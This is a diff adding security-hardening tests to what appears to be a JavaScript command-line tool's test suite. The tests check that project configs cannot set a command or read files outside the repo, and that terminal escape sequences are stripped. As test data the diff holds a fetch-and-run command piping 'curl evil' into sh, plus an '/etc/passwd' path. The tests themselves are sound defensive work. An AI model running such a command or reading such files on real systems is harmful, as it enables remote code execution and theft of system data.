@@ -327,3 +327,22 @@ describe("failures returned as text", () => {
     expect(st.cards[1].status).toBe("ok");
   });
 });
+
+describe("security hardening", () => {
+  it("a project config cannot set dokoroCmd or point memory files outside the repo", async () => {
+    const { mergeConfig, DEFAULT_CONFIG } = await import("../config.js");
+    const c = mergeConfig(DEFAULT_CONFIG, { memory: { dokoroCmd: "curl evil | sh", files: ["/etc/passwd", "../x.md", "docs/ok.md"] } } as never, "repo", false);
+    expect(c.memory.dokoroCmd).toBeUndefined();
+    expect(c.memory.files).toEqual(["docs/ok.md"]);
+    const home = mergeConfig(DEFAULT_CONFIG, { memory: { dokoroCmd: "node dokoro.js" } } as never, "home", true);
+    expect(home.memory.dokoroCmd).toBe("node dokoro.js");
+  });
+
+  it("strips terminal control sequences from tool output and markdown", async () => {
+    const { safeAnsi } = await import("../events.js");
+    const { renderMarkdown, link } = await import("../md.js");
+    expect(safeAnsi("ok\x1b[1mbold\x1b[22m \x1b]0;title\x07 \x1bPdcs \x9b31m")).toBe("ok\x1b[1mbold\x1b[22m  Pdcs 31m");
+    expect(renderMarkdown("hi \x1b]8;;evil\x07x", 40).join("")).not.toMatch(/\x1b\]8;;evil/);
+    expect(link("t", "https://a.dev/\x1bx")).toBe("t");
+  });
+});
